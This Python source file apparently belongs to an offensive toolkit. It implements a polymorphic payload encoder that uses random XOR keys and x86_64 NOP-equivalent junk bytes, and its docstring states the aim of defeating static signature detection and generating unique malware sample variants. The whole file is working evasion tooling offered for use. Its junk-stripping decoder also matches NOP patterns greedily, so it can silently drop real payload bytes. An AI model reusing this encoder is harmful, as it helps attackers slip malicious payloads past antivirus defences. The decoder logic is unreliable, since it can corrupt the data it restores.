"""Polymorphic encoder — random key per instance + junk instruction insertion.

Each invocation produces a unique byte sequence even for identical payloads.
Defeats static signature detection that relies on byte pattern matching.

Algorithm:
    1. Generate random XOR key per encoding
    2. XOR-encode the payload
    3. Insert randomized junk NOP equivalents between every N bytes
    4. Prepend metadata header with junk_interval so decoder can strip junk
    5. Optional: randomize stub register assignments in the decoder

Wire format:
    [magic:4][key_len:1][key:key_len][junk_interval:2][junk_size:1][payload_with_junk]
"""
from __future__ import annotations

import os
import random
import struct


_MAGIC = b"FGPX"   # Forge polymorphic magic


# x86_64 NOP equivalents — semantically equivalent to NOP but different bytes
_NOP_EQUIVALENTS: list[bytes] = [
    b"\x90",                          # NOP
    b"\x87\xc0",                      # XCHG EAX, EAX
    b"\x66\x87\xc0",                  # XCHG AX, AX
    b"\x89\xc0",                      # MOV EAX, EAX
    b"\x89\xdb",                      # MOV EBX, EBX
    b"\x89\xd2",                      # MOV EDX, EDX
    b"\x83\xc0\x00",                  # ADD EAX, 0
    b"\x83\xe8\x00",                  # SUB EAX, 0
    b"\x48\x87\xc0",                  # XCHG RAX, RAX (x64)
    b"\x48\x89\xc0",                  # MOV RAX, RAX (x64)
    b"\x48\x83\xc0\x00",              # ADD RAX, 0 (x64)
]


def poly_encode(
    data: bytes,
    key: bytes | None = None,
    junk_interval: int = 0,
    iterations: int = 1,
) -> bytes:
    """Polymorphically encode payload bytes.

    Args:
        data:          Raw payload bytes.
        key:           Optional XOR key (random if None).
        junk_interval: Insert junk NOP bytes every N real bytes (0 = no junk).
        iterations:    Number of encode passes.

    Returns:
        Encoded bytes with magic header for decoder.
    """
    result = data

    for _ in range(iterations):
        key_bytes = key or os.urandom(random.randint(4, 16))
        junk_int = junk_interval if junk_interval > 0 else random.randint(8, 32)
        junk_max_size = random.randint(1, 4)

        # XOR encode
        encoded = bytes(b ^ key_bytes[i % len(key_bytes)] for i, b in enumerate(result))

        # Insert junk bytes
        if junk_int > 0:
            encoded = _insert_junk(encoded, junk_int, junk_max_size)

        # Build wire format
        header = (
            _MAGIC
            + bytes([len(key_bytes)])
            + key_bytes
            + struct.pack("<H", junk_int)
            + bytes([junk_max_size])
        )
        result = header + encoded

    return result


def poly_decode(data: bytes) -> bytes:
    """Decode polymorphically encoded payload.

    Args:
        data: Bytes from poly_encode.

    Returns:
        Original plaintext bytes.
    """
    if not data.startswith(_MAGIC):
        raise ValueError("Missing FGPX magic header")

    offset = len(_MAGIC)
    key_len = data[offset]
    offset += 1
    key = data[offset:offset + key_len]
    offset += key_len
    junk_interval = struct.unpack("<H", data[offset:offset + 2])[0]
    offset += 2
    junk_max_size = data[offset]
    offset += 1
    encoded = data[offset:]

    # Strip junk bytes
    stripped = _strip_junk(encoded, junk_interval, junk_max_size)

    # XOR decode
    decoded = bytes(b ^ key[i % len(key)] for i, b in enumerate(stripped))

    # Check for nested poly layer
    if decoded.startswith(_MAGIC):
        return poly_decode(decoded)

    return decoded


def _insert_junk(data: bytes, interval: int, max_junk: int) -> bytes:
    """Insert NOP-equivalent junk bytes every interval real bytes."""
    result = bytearray()
    for i, byte in enumerate(data):
        result.append(byte)
        if i > 0 and (i + 1) % interval == 0:
            # Pick a random NOP equivalent, repeat 1-max_junk times
            nop = random.choice(_NOP_EQUIVALENTS)
            count = random.randint(1, max_junk)
            result.extend(nop * count)
    return bytes(result)


def _strip_junk(data: bytes, interval: int, max_junk: int) -> bytes:
    """Strip junk bytes inserted by _insert_junk.

    Strips by counting real bytes between insertion points.
    """
    result = bytearray()
    i = 0
    real_count = 0

    while i < len(data):
        result.append(data[i])
        i += 1
        real_count += 1

        if real_count % interval == 0:
            # Skip up to max_junk * max(NOP sizes) bytes
            # We detect NOP equivalents greedily
            skipped = 0
            max_skip = max_junk * max(len(n) for n in _NOP_EQUIVALENTS)
            while i < len(data) and skipped < max_skip:
                matched = False
                for nop in sorted(_NOP_EQUIVALENTS, key=len, reverse=True):
                    if data[i:i + len(nop)] == nop:
                        i += len(nop)
                        skipped += len(nop)
                        matched = True
                        break
                if not matched:
                    break

    return bytes(result)


def poly_mutate(data: bytes) -> bytes:
    """Re-encode an already poly-encoded payload to produce a new variant.

    Useful for generating multiple unique samples from the same payload.
    """
    # Decode, then re-encode with new random key
    try:
        plaintext = poly_decode(data)
    except Exception:
        plaintext = data
    return poly_encode(plaintext)
